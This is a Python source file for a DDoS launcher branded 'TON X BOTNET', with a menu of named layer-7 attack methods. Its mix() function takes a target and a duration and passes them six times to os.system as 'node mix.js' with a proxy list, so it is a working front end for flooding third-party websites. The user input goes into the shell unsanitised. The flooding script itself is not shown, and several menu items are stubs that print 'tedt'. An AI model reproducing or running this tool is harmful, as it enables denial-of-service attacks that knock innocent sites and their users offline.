# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs


def clear():
    # Untuk Windows
    if os.name == 'nt':
        _ = os.system('cls')
    # Untuk macOS dan Linux
    else:
        _ = os.system('clear')

# Contoh penggunaan
clear()

hijau   =   "\033[1;92m"
putih   =   "\033[1;97m"
abu     =   "\033[1;90m"
kuning  =   "\033[1;93m"
ungu    =   "\033[1;95m"
merah   =   "\033[1;91m"
biru    =   "\033[1;96m"
ungu2   =   "\33[3;47;43m" #Purple
putih2  =   "\033[0;47;90m"
merah2  =   "\033[0;30;91m"
birut   =   "\033[38;2;0;0;139m"

def menu():
    clear()
    print(f"""{birut}
                    ,MMM8&&&.
               _...MMMMM88&&&&..._
            .::'''MMMMM88&&&&&&'''::.
           ::     MMMMM88&&&&&&     ::
           '::....MMMMM88&&&&&&....::'
              `''''MMMMM88&&&&''''`
                    'MMM8&&&'
      {merah}     welcome to TON X BOTNET
      {biru}vip = true              vvip = true
	  {birut}ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
	  DDOS TOOLS BY MIKAEL""")
    main()
def help():
    print(f"""{birut}
                    ,MMM8&&&.
               _...MMMMM88&&&&..._
            .::'''MMMMM88&&&&&&'''::.
           ::     MMMMM88&&&&&&     ::
           '::....MMMMM88&&&&&&....::'
              `''''MMMMM88&&&&''''`
                    'MMM8&&&'
      {merah}     welcome to TON X BOTNET

	  
	  NAME              DESCRIPTION               TIME
	  PUSSY-MIXER        MIX  DDOS LAYER 7        COSTUM
	  TLS-TON            FREE DDOS LAYER 7        COSTUM
	  BROWSER            VVIP DDOS LAYER 7        COSTUM
	  KRAKATOA           VVIP DDOS LAYER 7        COSTUM""")
def mix():
   targets = input("target : ")
   time = input("time : ")
   print(f"""{birut}
                    ,MMM8&&&.
               _...MMMMM88&&&&..._
            .::'''MMMMM88&&&&&&'''::.
           ::     MMMMM88&&&&&&     ::
           '::....MMMMM88&&&&&&....::'
              `''''MMMMM88&&&&''''`
                    'MMM8&&&'
      {merah}     welcome to TON X BOTNET""")
   targets = input("target : ")
   time = input("time : ")
   os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
   os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
   os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
   os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
   os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
   os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")

def browser():
    host = input("target : ")
    print(f"""{birut}
                    ,MMM8&&&.
               _...MMMMM88&&&&..._
            .::'''MMMMM88&&&&&&'''::.
           ::     MMMMM88&&&&&&     ::
           '::....MMMMM88&&&&&&....::'
              `''''MMMMM88&&&&''''`
                    'MMM8&&&'
      {merah}     welcome to TON X BOTNET""")
    print(f"""
 {birut}TARGET : {merah}{host}
 {birut}TIME   : {hijau}hold
 {birut}port   : {hijau}443
 {birut}vip    : {hijau}true
 {birut}vvip   : {hijau}true
       {merah}attack by mikael """)
	 
def main():
	while True:
		sys.stdout.write(f"\x1b]2;[/] TON-X BOTNET :: VIP = TRUE :: VVIP = TRUE\x07")
		sin = input("\033[0;30;45mTON-X@BOTNET\x1b[1;37m\033[0m:🌌~# \x1b[1;37m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("pkill screen")
			os.system ("clear")
			menu()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			menu()			
		if sinput == "browser" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
			browser()
		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
			print("tedt")
		if sinput == "pussy-mixer" or sinput == "PUSSY-MIXER" or sinput == "mix" or sinput == "MIXER" or sinput == "mixer" or sinput == "mix":
			clear()
			mix()
		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
			print("tedt")
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()
		if sinput == "plan":
			print("tedt")
		elif sinput == "":
			main()
print(f"""{merah}
████████╗ ██████╗ ███╗   ██╗ ██████╗ ██╗ █████╗ 
╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝███║██╔══██╗
   ██║   ██║   ██║██╔██╗ ██║███████╗╚██║╚█████╔╝
   ██║   ██║   ██║██║╚██╗██║██╔═══██╗██║██╔══██╗
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝██║╚█████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝ ╚════╝ 
    WELCOME TO TON-X BOTNET""")
time.sleep(3)
clear()
print(f"""{birut}
⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠖⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀WELCOME TO TON X
⠀⣷⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀ 1.MENU
⠀⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 2.CREDIT
⠀⣿⣿⣿⣿⣿⣿⣧⡀⠤⠤⣤⣤⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 3.CONTACT⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣇⠀⣦⣤⣤⣄⣈⡉⠉⠛⠛⠷⢶⠄⢠⣴⣦⡀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠉⠉⠛⠛⠷⣦⣀⠀⠀⢻⣿⣿⣿⡀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⡆⠀⠀⠈⠉⠘⡇⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⢀⠀⢀⣀⣠⣤⡴⠾⠋⠀⠀⠀⢀⣠⡾⠃⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠶⠶⠶⠀⠿⠃⠘⠉⠉⠀⠀⢀⣀⣤⣴⠾⠛⠉⠀⠀⠀⠀⠀
⠀⣿⣿⣟⣉⣀⣀⣀⣀⣠⣤⣤⣤⣴⡶⠶⠿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
s1 = input("> ")
if s1 == "1":
    clear()
    menu()